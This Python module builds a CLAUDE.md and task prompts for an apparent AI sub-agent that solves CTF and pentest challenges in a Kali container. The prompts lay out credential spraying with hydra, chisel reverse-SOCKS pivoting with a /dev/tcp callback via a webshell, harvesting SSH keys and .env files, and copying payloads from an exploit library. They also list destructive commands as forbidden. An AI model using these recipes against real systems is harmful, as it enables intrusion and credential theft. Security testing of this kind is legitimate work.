from __future__ import annotations

import os
import re
import socket
from typing import Optional

from .task import AgentTask
from . import playbooks

_LOCAL_IP: list = [""]


def _local_ip() -> str:
    if _LOCAL_IP[0]:
        return _LOCAL_IP[0]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("10.255.255.255", 1))
            _LOCAL_IP[0] = s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        _LOCAL_IP[0] = "<我方监听IP>"
    return _LOCAL_IP[0]


CLAUDE_MD = """# 解题环境与工作空间（Kali 容器）

- 这是一个自带渗透测试工具链的 Kali 容器，当前目录就是本题的解题工作空间，命令日志/较大扫描结果写在这里。

# 已装工具（直接调用；标"若已装"的是尽力安装，缺了就退回手写）
- Web：nmap / masscan / ffuf / gobuster / dirb / sqlmap / nikto / whatweb / curl / wget / nuclei(`-tags <product>,cve`)；
  mitmproxy（拦截/重放/篡改，若已装）、playwright(`python3 -m playwright`，驱动 chromium 无头，若已装)；php-cli / psql。
- 二进制/逆向：gdb(+gef，若已装) / radare2 / binutils(objdump,readelf,strings,nm) / xxd / file / patchelf / cpio /
  qemu-user(`qemu-aarch64 -L /usr/aarch64-linux-gnu ...` 跑异架构) / one_gadget(若已装)。python3: pwntools, capstone, unicorn, angr(若已装)。
- 密码学：python3 pycryptodome / sympy / gmpy2 / z3-solver / fpylll(LLL/Coppersmith) / numpy / pillow。
  通用套路：先找"唯一弱参数"→ LLL/Coppersmith/线性化 → 常见最终包裹 `AES-ECB(SHA256(str(secret)))`。
- 取证：tshark(`-r f.pcap -Y ... -T fields -e ...`) / binwalk / foremost / exiftool / steghide / sleuthkit(fls,icat) /
  poppler(pdftotext) / upx。python3: pefile, regipy/python-registry, xdis, capstone。git 对象恢复：
  `git fsck --unreachable --dangling` / `git show <commit>^:<path>` / `git cat-file -p <oid>`。
- 区块链：Foundry `forge`/`cast`/`anvil`（若已装，主路径：`forge create --broadcast --legacy`、`cast call/send`、`cast call 'isSolved()(bool)'`）；
  python3: web3, eth-account, solcx(py-solc-x)。handler 常是 nc 菜单或 HTTP `/api/*` 发 RPC_URL/PRIVKEY/SETUP，打完读 isSolved/check 拿 flag。
- 口令/爆破：hydra / john / sshpass；认证喷射一律 `python3 /opt/tools/authspray.py`（ssh/http 双模式，
  传输失败与认证拒绝分开计数、限速、--max-tries 200 小而准上限、依赖自检、命中即停——别手搓，手搓已两次假阴/一次假阳）。
  目标在内网时(经 chisel SOCKS/socat 中继可达)：`proxychains4 python3 /opt/tools/authspray.py http ...` 直接走隧道；
  ssh 模式同样 `proxychains4 ... ssh ...`。chisel SOCKS 连发易抖(GeneralProxyError)时，改在据点
  `socat TCP-LISTEN:<p>,reuseaddr,fork TCP:<目标>:<端口>` 建单连接中继、authspray 直打据点IP:<p>——比共享 SOCKS 稳一个量级。
  **若 authspray ssh 报 DEPENDENCY-MISSING(缺 ssh 二进制)**：改用 hydra 兜底——`proxychains4 hydra -L users.txt -P pass.txt -t 4 -W 5 -f ssh://<内网IP>:22`（hydra 走 libssh 自带实现，不依赖 openssh 二进制）；`-t 4` 低并发 + `-W 5` 退避防 flap 把靶机打 down，`-f` 命中即停。同样可走 proxychains4/socat 打内网。
- 代理与穿透：chisel(`/usr/local/bin/chisel`，正/反向 SOCKS，若已装) / proxychains4 / socat / ncat / rlwrap。
- 内网/域：impacket 脚本在 `/usr/local/bin/`（psexec.py/wmiexec.py/secretsdump.py/GetUserSPNs.py…），配 proxychains4 走代理链。
- Java 反序列化/JNDI：`java -jar /opt/tools/ysoserial.jar`；恶意 LDAP/RMI 引用服务 `java -jar /opt/tools/marshalsec.jar`、
  一键 JNDI 投递 `java -jar /opt/tools/JNDI-Injection-Exploit.jar`（fastjson/log4shell/JNDI 链的投递端）。JWT：`python3 /opt/tools/jwt_tool/jwt_tool.py <JWT>`。容器逃逸：cdk(若已装)。
- 移动(Android/APK)：`apktool d app.apk`(smali+资源) / `jadx -d out app.apk`(可读 Java) / `aapt dump badging`(manifest) /
  `apksigner`/`zipalign` / `adb` / `d2j-dex2jar.sh`；python3: androguard。动态差分 `frida`/`objection`(若已装，无设备就整段跳过，静态是默认)。
  制胜多为静态：`grep -rniE 'flag\\{|secret|token|AES|Base64|decrypt' out/`，本地复现其 XOR/AES/Base64 变换(同逆向的已知明文 oracle)。
- OCR/图像取字（模型看不到图，一律走工具）：扭曲/彩色验证码首选 `python3 -c "from rapidocr_onnxruntime import RapidOCR;print(RapidOCR()('cap.png'))"`（强）；干净固定字体用 `tesseract cap.png out --psm 8 -c tessedit_char_whitelist=0-9A-Za-z`。先 PIL/cv2 预处理（灰度→二值→去噪→去斜→切字符）。redis-cli / mysql(或 mariadb) / psql。
- CVE/PoC 离线知识库 `/opt/kb`（禁出网环境的第一信源；识别出已知组件**绝不当自研 bug 手工 fuzz**，先按此顺序找现成链）：
  ① `/opt/tools/cve-quick.json`（版本指纹→一句话利用要素）与 `recall_knowledge`；
  ② 指纹命中产品/版本 → `nuclei -u <url> -tags <product>,cve`（见"升级重武器"）；
  ③ 已知 CVE 号或产品名 → 先 `grep -i <CVE号|产品名> /opt/kb/INDEX.txt` 定位文件，再读对应 md/py 拿现成 PoC、利用步骤与请求样例：
     `vulhub/`（按产品组织的漏洞原理+利用说明）、`PayloadsAllTheThings/`（注入/上传/SSRF/绕过 payload 全集）、
     `awesome-poc/`（中文产品 PoC：CMS/OA/中间件/数据库/开发框架…）、`exphub/`（fastjson/weblogic/shiro 等 Java 链）、
     `marcio-cve/`（按年份的 CVE md，若已装）、`trickest-cve/`（全量 CVE PoC 汇总，若已装）。查完库仍无 → 才走自研 fuzz。
- 云：awscli / boto3（`aws --endpoint-url <url> ...` 或 boto3 `endpoint_url=`）。先找暴露凭证（页面/接口的
  player-creds.json、.aws/credentials、AWS_ENDPOINT_URL），localstack 端点常在 `http://<host>-localstack:4566` 或 `http://localstack:4566`。
  流程：`sts get-caller-identity` 先看身份 → 枚举 s3/ssm/iam/secretsmanager/kms/dynamodb → S3 历史版本回滚
  (`list-object-versions` + `get-object --version-id`) → `kms decrypt`(`kms:v3:`密文) → AssumeRole(带 ExternalId)/建 access-key 提权。
  CloudTrail 取证内核：翻 `lookup_events` → `json.loads(CloudTrailEvent)` → 按 sourceIP+userIdentity 分组；AKIA→ASIA 转换；
  盯反取证尾巴 StopLogging/PurgeQueue。IMDS 169.254.169.254。cloudfox(若已装)。
- OOB 盲打预言机（若注入了 OOB_HTTP_BASE/OOB_DOMAIN）：无回显的 SSRF/SQLi/XXE/RCE 让目标回连 `<token>.<OOB_DOMAIN>`，
  收到回调=证据；没回调别当已打通。
- 源码审计：ripgrep(rg) / bandit / 直接读；给了源码就白盒读数据流（认证≠授权：漏洞常在授权读了签名集之外的字段/信客户端身份）。CTF 源码多为几个小文件，`rg -n 'flag|secret|token|passwd|eval|system|exec|md5|==|strcmp' 源码目录` + 直读通常比写规则快。
- 缺库就手写：很多题的制胜脚本是纯 python stdlib 手搓解析器（struct 切内存/PE/registry/DER、raw socket 打 Modbus/IEC-104）。
  库不在别卡住，struct/socket/zlib/hashlib 手写往往更快。
- 持续运行/交互命令放 tmux。字典**实际可用路径**（别去猜不存在的路径）：目录爆破用 `/usr/share/wordlists/raft-medium-directories.txt`、`/usr/share/wordlists/common.txt`、文件用 `raft-medium-files.txt`、参数用 `/usr/share/wordlists/burp-parameter-names.txt`、API 用 `/usr/share/wordlists/api/api-endpoints.txt`；同一套在 `/usr/share/seclists/Discovery/Web-Content/` 也有；`/usr/share/dirb/wordlists/common.txt`/`big.txt` 兜底。先用小字典(common)再上大字典。

# 升级重武器（这些工具已装但常被漏用——到点就上，别只停在 curl/手测）
- 指纹到任何产品/版本，先 `nuclei -u <url> -tags <product>,cve`（自动命中已知 CVE，胜过手工试）；别跳过。
  常用速查（指纹→-tags）：__NUCLEI_CHEATSHEET__
- 二进制非平凡就反编译，不要只 `objdump`：`r2 -q -c 'aaa; s main; pdc' <bin>`（pdc=反编译）看伪代码，再定位算法/检查点。
- 多阶段一旦拿到面向内网的立足点，立刻 pivot：`chisel` 反向 SOCKS + `proxychains4` 打内网，别停在第一台。
- 每拿一个立足点必洗横向凭据：`~/.ssh/id_rsa`/`known_hosts`(→ssh 下一跳)、`.env`/`config.php`/`.bash_history`、DB、`/var/www` 源码。
- Windows/AD 场景用 impacket（`python3 -m impacket.examples.*` 或已装脚本）；JWT 试 `alg:none`/`kid` 注入；反序列化用 ysoserial(java)/手搓 pickle(py)。

# 解题约定（重要）
- 深度优先、范围收窄：`nmap --top-ports 100 -T4` 优于全端口；小字典先于大字典；`sqlmap --batch --level 1` 起步；单条命令别超约 60s——深度靠多步迭代，不靠一次巨扫。
- 手写 curl / python 探测优先于重型框架（更快更省噪声小）；框架打不动再上。
- 别翻自己的会话记录:上几轮的结论已在 `MEMORY.md`(开局先读它),**不要 grep/解析 `_transcripts/*.jsonl` 原始日志**(巨大且浪费一整个 session)——要续力就读 MEMORY.md 的"已确认信息",然后直接接着打靶机,而不是回顾自己干过啥。
- 区分两类卡住：基础设施阻塞（不可达/工具缺/靶机未起）→ 说明原因并停；某条利用路径不通 → 换技术类/假设继续，
  未拿到并证实 flag 前不要声称"做完"。别 `grep -r /` 或无 -maxdepth 的 `find /`；会读 stdin 的裸命令加 `</dev/null` 或进 tmux。
- flag 忠实：按目标真实输出原样提交，不改大小写/不裁剪/不重排；逆向或解码派生且大小写有歧义时，FinalAnswer 里同时给候选变体。
- 绝不编造 flag：只有 flag 字符串真实出现在某条命令的真实输出里，才算拿到。
- 【运行时无外网】本容器运行时完全禁止出网：`pip install`/`apt install`/`git clone`/从 GitHub 下载一律会失败——
  工具缺了就用已装工具或纯 python stdlib 手写替代，别浪费一轮去装、别重试第二次。所有该有的都已在构建期装好。
- 【无 CAP_NET_RAW】没有原始套接字权限：`nmap` 的 SYN/-sS 扫描与 ping 会直接 `Operation not permitted`——
  别再试第二次；改用 `nmap -sT`(TCP connect) 或 bash `/dev/tcp` 端口探测(`for p in ...; do (echo>/dev/tcp/host/$p)... ; done`)。
- 【实例保护·不可逆操作禁令】目标实例是你唯一的立足点，杀了它=本题归零还搭上一轮重启：绝不执行任何
  "关掉它"的操作——`Connector.stop`/停容器、`shutdown`/`reboot`/`init 0`/`poweroff`、`rm -rf` 系统目录
  (/etc /usr /var /boot /lib)、`mkfs`/`dd of=/dev/*`、杀靶机主服务进程、fork 炸弹。想要的状态拿不到就换
  只读思路（读配置/读进程/读 socket/读数据库），不是毁现场。
- 【实例重建后的重定位】目标每次重建 IP 都会变：按服务指纹重定位（端口/标题/Set-Cookie/自描述 JSON/
  横幅），**禁止 nmap /24 或全网段扫**——慢、越界、可能把别题实例当成本题。脚本一律 $TARGET 参数化，
  单主机定向探测优先。
"""


def _render_nuclei_cheatsheet() -> str:
    try:
        return " · ".join(f"{kw}→`{tags}`" for kw, _label, tags in playbooks._NUCLEI_TAG_TABLE)
    except Exception:
        return "(见 nuclei -tl 自列)"


CLAUDE_MD = CLAUDE_MD.replace("__NUCLEI_CHEATSHEET__", _render_nuclei_cheatsheet())

_MEMORY_HEADER = "# 本题已确认信息（前次会话沉淀，续力用）"


def write_claude_md(workdir: str) -> str:
    os.makedirs(workdir, exist_ok=True)
    path = os.path.join(workdir, "CLAUDE.md")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(CLAUDE_MD)
    except OSError:
        pass
    return path


_SKIP_ARTIFACTS = {"CLAUDE.md", "MEMORY.md", "FLAG", "flag.txt", "FLAG.txt", "_blackboard.json", "_trace.json"}


def _reusable_artifacts(workdir: str) -> str:
    import glob
    picks = []
    try:
        for name in sorted(os.listdir(workdir)):
            if name in _SKIP_ARTIFACTS or name.startswith((".", "_")) or name == "__pycache__":
                continue
            p = os.path.join(workdir, name)
            low = name.lower()
            if os.path.isfile(p):
                try:
                    st = os.stat(p); size, mt = st.st_size, st.st_mtime
                except OSError:
                    continue
                if low.endswith(".sh"):
                    picks.append((mt, f"脚本(重跑恢复): bash {name}"))
                elif any(k in low for k in ("cred", "loot", "host", "id_rsa", "secret", "token", "key", "cookie", "sess")):
                    picks.append((mt, f"战利品(直接读用): cat {name}"))
                elif low.endswith(".py") and size > 200:
                    picks.append((mt, f"脚本(重跑恢复): python3 {name}"))
                elif low.endswith(".json") and size > 200:
                    picks.append((mt, f"数据(直接读用): cat {name}"))
                elif low.endswith(".jar"):
                    picks.append((mt, f"工具: {name}"))
            elif os.path.isdir(p) and low in ("recon", "loot", "www", "src", "uploads"):
                n = len(glob.glob(os.path.join(p, "*")))
                if n:
                    picks.append((os.path.getmtime(p), f"目录({n}项,已探明情报): ls {name}/"))
    except OSError:
        return ""
    if not picks:
        return ""
    picks.sort(key=lambda x: -x[0])
    lines = ["## 【已有可复用产物】（重访先复用这些恢复立足点/隧道/情报，勿从零重建 recon→foothold→pivot）"]
    lines += [f"- {label}" for _mt, label in picks[:15]]
    return "\n".join(lines)


def write_memory(workdir: str, board, *, extra: str = "", handoff: str = "") -> str:
    os.makedirs(workdir, exist_ok=True)
    path = os.path.join(workdir, "MEMORY.md")
    body = [_MEMORY_HEADER, ""]
    if handoff and handoff.strip():
        body += ["## 【接力/利用假设】（续力点：从这里的「下一步动作」直接开始利用，勿重复侦察）",
                 handoff.strip(), ""]
    arts = _reusable_artifacts(workdir)
    if arts:
        body += [arts, ""]
    body += [board.render(), ""]
    if extra:
        body += ["## 备注", extra, ""]
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(body))
    except OSError:
        pass
    return path


def build_task_prompt(
    task: AgentTask,
    board,
    *,
    knowledge=None,
    runstore=None,
    hint: Optional[str] = None,
    current_intent: Optional[str] = None,
    prior_memory_path: Optional[str] = None,
    session_idx: int = 0,
    tried_commands: Optional[list] = None,
    slots_note: Optional[str] = None,
    spray_alert: Optional[str] = None,
    lane_note: Optional[str] = None,
) -> str:
    category = playbooks.classify(task)
    playbook = playbooks.get(category)

    card_block = ""
    card_fp_tokens: list = []
    if knowledge is not None:
        try:
            hits = knowledge.force_recall(f"{task.objective} {hint or ''} {board.render()}",
                                          top_k=1, first_visit=(session_idx == 0),
                                          category=category)
            if hits:
                card_block = "\n# 命中的利用卡（优先验证其思路/oracle/坑）\n" + hits[0][0].render() + "\n"
                _e = hits[0][0]
                if not (getattr(_e, "category", "") or "").strip() or \
                        _e.category.strip().lower() == (category or "").strip().lower():
                    card_fp_tokens = [str(t) for t in (_e.fingerprint or [])]
        except Exception:
            card_block = ""

    learn_block = ""
    if runstore is not None and len(runstore):
        try:
            from . import attack
            techs = attack.match_techniques(f"{task.objective} {hint or ''}", top=4)
            lessons = runstore.recall(f"{task.objective} {hint or ''}", techniques=techs, top=3,
                                      exclude_source=task.unique_code or "")
            if lessons:
                learn_block = "\n" + runstore.render(lessons) + "\n"
        except Exception:
            learn_block = ""

    creds_block = ""
    if runstore is not None:
        try:
            _cb = runstore.render_creds()
            if _cb:
                creds_block = "\n" + _cb + "\n"
        except Exception:
            creds_block = ""

    deadend_block = ""
    if runstore is not None:
        try:
            de = runstore.render_deadends(task.unique_code or "")
            if de:
                deadend_block = "\n" + de + "\n"
        except Exception:
            deadend_block = ""

    prior_block = ""
    if prior_memory_path and os.path.isfile(prior_memory_path):
        prior_block = (
            "\n【前次执行详细记录（必须先读）】\n"
            f"开工前先用 Read 读取本文件，基于已确认结果继续，不要重复已完成的步骤：\n{prior_memory_path}\n"
            "文件顶部的【接力/利用假设】就是你的续力点：直接从那个假设与「下一步动作」开始利用，"
            "不要重跑已完成的指纹/侦察。若假设已被前次排除，读其「已排除」清单换下一条路。\n"
        )
        try:
            with open(prior_memory_path, encoding="utf-8") as _f:
                _mem = _f.read()
            _m = re.search(r"## 【接力/利用假设】[^\n]*\n(.*?)(?=\n## |\Z)", _mem, re.S)
            if _m and _m.group(1).strip():
                prior_block += ("\n【接力/利用假设·已内联（直接从这里续，勿重复侦察）】\n"
                                + _m.group(1).strip()[:800] + "\n")
        except OSError:
            pass

    tried_block = ""
    if tried_commands:
        from collections import Counter
        raw = [str(c).strip() for c in tried_commands if str(c).strip()]
        cnt = Counter(c[:80] for c in raw)
        recent, seen = [], set()
        for c in reversed(raw):
            k = c[:80]
            if k not in seen:
                seen.add(k)
                recent.append(c)
        recent = recent[:20][::-1]
        if recent:
            lines = [f"$ {c[:160]}" + (f"  ×{cnt[c[:80]]}" if cnt[c[:80]] >= 2 else "") for c in recent]
            worst = max(cnt[c[:80]] for c in recent)
            tried_block = ("\n【上一会话已执行命令】（这些已试过，别重复；从其结论的下一步开始，换新输入/新路径）\n"
                           + "\n".join(lines) + "\n")
            if worst >= 3:
                tried_block += (f"【重复告警】上面标 ×N 的命令已重复执行 {worst} 次仍无突破——按方法论第 4 条死路硬切换："
                                "立即换技术类，并把该路径写进 <Handoff> 的「已排除」，不要再跑"
                                f"第 {worst + 1} 次。\n")

    flag_line = f"Flag 格式：{task.flag_format}" if task.flag_format else "Flag 形如 flag{...} 或 NAME{...}"
    multi = f"（本题共 {task.flag_count} 个 flag，全部找出）" if task.flag_count > 1 else ""
    graph_state = board.render()
    nuclei_hint = ""
    try:
        _prod, _tags = playbooks.nuclei_tags_for(graph_state)
        _kws = playbooks.kb_grep_products(f"{task.objective} {graph_state}")
        _extra = [t for t in card_fp_tokens
                  if t.isascii() and len(t) >= 4 and not t.isdigit() and " " not in t
                  and not any(t in k or k in t for k in _kws)][:1]
        if _prod and _tags:
            _hit_kw = next((kw for kw, label, _t in playbooks._NUCLEI_TAG_TABLE if label == _prod), _kws[0] if _kws else "")
            nuclei_hint = (f"\n【指纹命中 {_prod} → 先打已知漏洞，勿自研 fuzz；下面两行直接执行】\n"
                           f"`nuclei -u <target> -tags {_tags} -severity critical,high`\n"
                           f"`grep -ri '{_hit_kw}' /opt/kb/INDEX.txt`  # 定位 kb 现成利用配方，cat 命中文件抄 payload\n")
        elif _kws or _extra:
            _lines = [f"`grep -ri '{k}' /opt/kb/INDEX.txt`" for k in _kws]
            _lines += [f"`grep -ri '{t.lower()}' /opt/kb/INDEX.txt`" for t in _extra]
            nuclei_hint = ("\n【本地 /opt/kb 离线语料（vulhub/PAT/PoC 现成利用）——先跑下面的行定位配方，"
                           "命中后 cat 该文件抄 payload，勿从零手写 exploit】\n" + "\n".join(_lines[:2]) + "\n")
    except Exception:
        nuclei_hint = ""

    chisel_hint = ""
    try:
        _mine = set(re.findall(r"\d+\.\d+\.\d+\.\d+", task.target_str() or ""))
        _internal = sorted({ip for ip in re.findall(
            r"(?:172\.(?:1[6-9]|2\d|3[01])|10\.\d{1,3}|192\.168)\.\d{1,3}\.\d{1,3}", graph_state)
            if ip not in _mine})
        if _internal:
            _me = _local_ip()
            chisel_hint = (f"\n【发现内网目标 {'、'.join(_internal[:3])} → 经据点建全 TCP 隧道（完整配方，勿手搓 HTTP 转发）】\n"
                           f"1. 方向判定（先经 webshell 在靶机执行）：`timeout 5 bash -c 'echo>/dev/tcp/{_me}:7000' && echo CALLBACK-OK || echo NO-CALLBACK`\n"
                           f"2. 默认 FORWARD（NO-CALLBACK 时，我们的 VPN 拓扑多为单向）：先经 webshell 落地镜像里的 "
                           f"`/usr/local/bin/chisel` 到靶机，靶机侧执行 `./chisel server -p 9000 --socks5`；"
                           f"我方执行 `chisel client <靶机IP>:9000 socks`\n"
                           f"3. 仅 CALLBACK-OK 才用反向：靶机 `./chisel client {_me}:7000 R:socks`，我方 `chisel server -p 7000`\n"
                           "此后一切内网工具走代理：`proxychains4 ssh <user>@<内网IP>`（SSH/RDP 等二进制协议经 HTTP 转发端点"
                           "必然握手失败，必须全 TCP 隧道；chisel 不可用时 socat 正/反向备选）\n")
    except Exception:
        chisel_hint = ""

    default_creds_block = ""
    try:
        _fam = playbooks.default_creds_for(f"{task.objective} {graph_state}")
        if _fam:
            default_creds_block = ("\n【指纹默认凭据族——新认证面第一波：先逐条试本族 + 上方凭据池（若有），最后才上字典】\n"
                                   + "\n".join(f"- {c}" for c in _fam) + "\n")
    except Exception:
        default_creds_block = ""
    if (creds_block and not default_creds_block
            and re.search(r"login|登录|登陆|sign ?in|401|403[^0-9]|unauthorized|auth", graph_state, re.I)):
        creds_block = ("\n【新认证面出现——第一波先逐条重放「本场凭据池」（低风险单试，勿自动爆破），"
                       "再考虑字典】\n" + creds_block.lstrip("\n"))
    intent = current_intent or "对目标做初步侦察：识别指纹/服务/入口，形成第一个可验证的漏洞假设。"

    return f"""【角色说明】
你是运行在自带渗透测试工具链的 Kali 容器内的 Claude Code 子 Agent，专攻安全评测/CTF 解题，由主控 Agent 分配任务。
你的产物由主控做对抗式校验后统一提交，因此你不必自行提交 flag；你的唯一职责是"拿到并证明" flag。

【方法论（务必内化，非口号）】
1) 第一性原理定位漏洞：面对任一功能，先问三问——(a) 它处理的敏感操作/数据的安全不变量是什么？
   (b) 哪个输入是攻击者可控的？(c) 用什么最小输入能在哪个 sink 打破该不变量？据此形成"可证伪的假设"，
   而不是盲目套 payload。
2) 剃刀式行动：只做推进当前假设所必需的最小动作。范围收窄、深度优先；单条命令别跑到超过约 60s；
   能用一条 curl/python 验证的，不要起重型扫描器。
3) 墨菲式自证：宣布拿到 flag 前，先假设它是假的，主动排除——环境噪声、诱饵、输出并非唯一由该漏洞解释、
   触发路径其实不可达、大小写/边界被你改动过。排除不掉就继续找证据，别急着收。
   **例外（服务端下发的旗形值）**：靶机在 Set-Cookie / 响应头 / 响应体里**亲手下发**的 flag 形态值（含 URL
   编码形式 flag%7B…%7D）——这是目标真实输出，不是你的猜测或诱饵 paranoia 的对象。解码 → 写 FLAG → 让主控
   交一次验证。被平台拒了才算证伪，**不许仅凭"像诱饵"的直觉不交**（一次错误提交的代价 << 烧一整场猜疑）。
4) 死路硬切换（可计数、强制执行）：同一方法（同端点/同技术类/同一爆破目标）连续 3 次执行仍无新信号
   ——立即停用该方法，换下一个技术类（枚举 -> 越权篡改 -> 注入 -> 逻辑/竞态 -> 反序列化/模板/SSRF内网），
   并把该路径连同一句失败原因写进结尾 <Handoff> 的「已排除」行（下个会话靠它不重走）。
   爆破类尤其如此：同一目标 3 轮没出新凭据/新入口 = 字典已尽或方向错误，不是再跑一次的理由。
{deadend_block}{lane_note or ''}{slots_note or ''}{spray_alert or ''}{prior_block}{tried_block}
【用户任务】
Target: {task.target_str()}
【注意】目标地址每次会话可能重建、IP 会变——**以上 Target 是本次唯一真实地址**。接力块/MEMORY/你上次写的脚本里出现的任何旧 IP 一律当过期，别去连它；把利用方法重新指向本次 Target（脚本用 `$TARGET` 参数化，别写死 IP）。上次已达成的"原语"（任意读/RCE/已破解口令）是真的、可信，但**要用本次 Target 重放一遍利用配方**再继续，别推翻重来、也别信旧地址。
Goal: 找到并取得所有 flag{multi}；{flag_line}
提示: {hint or '（无额外提示，按侦察结果推进）'}
Origin/description: {task.objective}
Category: {category}
Current Intent: {intent}
Graph State:
{graph_state}
{nuclei_hint}{chisel_hint}{card_block}{creds_block}{default_creds_block}{learn_block}
{playbook}

【本地 kb 纪律（常驻，任何会话适用）】
侦察中从响应头/错误页/favicon/端口指纹识别出的任何 server/框架/产品名或 CVE 号（jetty、spring、tomcat、CVE-2025-xxxxx 这类**字面字符串**），立即原样执行：
`grep -ri '<该字符串>' /opt/kb/INDEX.txt`
命中则 cat 该目录下的 README / poc（vulhub 的 poc.py 常可直接跑出验证）。**先查 kb，再考虑外部字典或自研 fuzz**——组件级 CVE 的利用配方大概率就躺在里面；尤其路径归一化类漏洞（curl/浏览器打不出、需要 raw-socket 发原始字节的）几乎只能靠 kb 里现成的 poc。

【收束与自校验（决定成败）】
- 一步一动作，真实观测驱动下一步：侦察 -> 第一性假设 -> 最小验证 -> 利用 -> 墨菲式自证 -> 取 flag。
- 区分两类"卡住"，别混：① 基础设施阻塞（目标不可达 / 工具缺失 / 靶机未起 / 凭证无效）→ 立刻说明具体原因并停，
  不要空转到超时；② 某条利用路径走不通 → 这不是收工的理由，换一个技术类或假设继续（枚举→越权篡改→注入→
  逻辑/竞态→反序列化/模板/SSRF内网），直到拿到 flag 或预算真正耗尽。**未拿到并证实 flag 前，不要声称"做完/搞不定"。**
- 命令别挂死：会读 stdin 的裸命令（裸 `cat`、错误的 heredoc、交互式提示、`nc` 不带超时）会继承 stdin 永久阻塞，
  用 `</dev/null` 或放进 tmux；连交互服务用 pwntools 并给每个 recv 加 timeout。别 `grep -r /` 或无 `-maxdepth` 的
  `find /`（会扫穿 /proc /sys 烧光预算），范围收窄到 /app /var/www /srv /home /root /tmp。
- 【提交纪律，务必照做】一旦你**确证**拿到某个 flag，立刻把它——只把你确证的那一个——原样追加写入工作目录的
  `FLAG` 文件（一行一个）：`printf '%s\n' 'flag{...}' >> FLAG`。主控只提交你写进 `FLAG` 的内容,不会去扫你输出里
  所有像 flag 的字符串。所以:**别把响应里的 session-id/request-id/trace-id、二进制里内嵌的诱饵串、你的猜测写进
  `FLAG`**；只有"确证由本次利用得到、且真实出现在某条命令输出里"的那个才写。宁可不写,也不要写没把握的。
- 在 <FinalAnswer>...</FinalAnswer> 内交付，且必须包含：
  1. flag 原样字符串（严格照目标真实输出，不改大小写/不裁剪；逆向或解码推导且大小写有歧义时，一并给出候选变体，
     并明确哪个是你最确信的一个）；
  2. 追问式自证（逐条回答）：这个 flag 出自哪条命令的哪段真实输出？该输出是否"唯一"由此利用解释？是否匹配要求的格式？
  3. 完整可复现利用链（关键命令 + 触发 payload + 响应片段），便于主控复核。
- 绝不编造：flag 必须真实出现在某条命令的真实输出里，否则宁可交"未取得 + 已排除方向"。
- 若本次未拿到 flag（会被稍后重访续力），务必在结尾额外给出接力块，让下次会话从"利用"而非"侦察"续起：
  <Handoff>
  目标指纹: <产品/版本/框架/服务，及最能定位它的证据>
  已达成原语: <本次已经拿到的"胜利态"——任意文件读 / RCE(附实测 uid，必须是你本次真在输出里看到的，没看到就别写)/ 已破解的口令或密钥 / 已建的隧道。续力者从这里的"最后一公里"续起，别重做侦察去重拿它。>
  利用配方: <把已达成原语写成"对着本次 Target 重放"的步骤/脚本（用 $TARGET 占位，绝不写死 IP）：一条 rce.sh/tunnel.sh/exploit.py 的调用即可重建立足点。>
  下一步动作: <紧接"已达成原语"的下一步——具体到可直接执行的一条命令或 payload；若已达成任意读，这里就是 flag 文件清单里还没读的路径(尤其 /challenge/flag*、/proc/self/maps 定位 CWD)。>
  已排除: <本次试过但走不通的路径/payload，附一句为什么，避免下次重犯>
  已得凭证: <session/token/cookie/creds，若有（凭证跟着服务走，通常 IP 变了仍可用）>
  后台任务: <还在跑的 tmux 会话名 + 输出文件路径 + 预计时长——长任务先 tmux+落盘再启动；下个会话
            直接 tail 该文件续力，绝不重启同任务（visit 随时会被掐断，没进 tmux 的长任务=白干）>
  已验证产出物: <webshell 路径 / 凭据 / 密钥 / 落盘脚本 / 导出文件(zip 等) 清单——它们是下一段链条的
            输入件，续力时直接拿来喂下一段，别当不存在重新找>
  </Handoff>
  纪律：① 只写你本次真在命令输出里证实过的（墨菲：宁缺毋滥；绝不臆断 uid/root/已控主机）；② 一切地址用 $TARGET，不写死旧 IP；③ "已达成原语 + 利用配方"是重点——目的是让续力者 30 秒重放拿回立足点、直扑最后一公里，而不是从零侦察。
"""
